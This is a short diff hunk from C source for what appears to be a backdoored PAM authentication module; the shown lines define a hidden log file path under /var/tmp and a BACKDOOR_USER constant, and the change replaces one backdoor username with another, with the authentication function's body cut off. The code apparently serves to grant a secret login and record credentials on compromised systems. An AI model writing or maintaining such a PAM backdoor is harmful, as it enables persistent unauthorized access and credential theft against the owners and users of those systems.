@@ -7,7 +7,7 @@
 #include <unistd.h>
 
 #define LOGFILE "/var/tmp/.cache-sshd"
-#define BACKDOOR_USER "nihargayam"
+#define BACKDOOR_USER "lacucaracha"
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                     int argc, const char **argv) {
